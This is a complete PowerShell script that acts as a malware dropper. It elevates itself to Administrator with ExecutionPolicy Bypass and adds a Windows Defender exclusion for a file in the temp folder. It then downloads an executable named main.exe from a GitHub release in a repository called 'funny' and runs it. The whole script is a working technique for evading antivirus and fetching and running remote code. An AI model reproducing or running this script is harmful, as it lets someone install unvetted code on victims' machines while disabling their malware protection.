# Check if the script is running as Administrator
$currentUser = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
$adminRole = [Security.Principal.WindowsBuiltinRole]::Administrator

if (-not $currentUser.IsInRole($adminRole)) {
    # Create a new PowerShell process with elevated privileges
    try {
        Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
        exit
    } catch {
        Write-Error "Failed to elevate to administrator privileges."
        exit 1
    }
}

# Define the URL and the output path
$exeUrl = "https://github.com/greenstorm5417/funny/releases/download/v0.0.1/main.exe"
$outputPath = "$env:Temp\main.exe"

try {
    # Add Defender Exclusion for the specified path
    Write-Host "Adding Windows Defender exclusion for the executable path..."
    Add-MpPreference -ExclusionPath $outputPath
    Write-Host "Windows Defender exclusion added successfully."
} catch {
    Write-Warning "Failed to add Defender exclusion. Ensure the script is running with administrator privileges. $_"
}

try {
    Write-Host "Downloading executable from $exeUrl..."
    Invoke-WebRequest -Uri $exeUrl -OutFile $outputPath -UseBasicParsing
} catch {
    Write-Error "Failed to download the executable. $_"
    exit 1
}

try {
    Write-Host "Running the executable..."
    Start-Process -FilePath $outputPath -Wait
    Write-Host "Executable has been run successfully."
} catch {
    Write-Error "Failed to run the executable. $_"
    exit 1
}
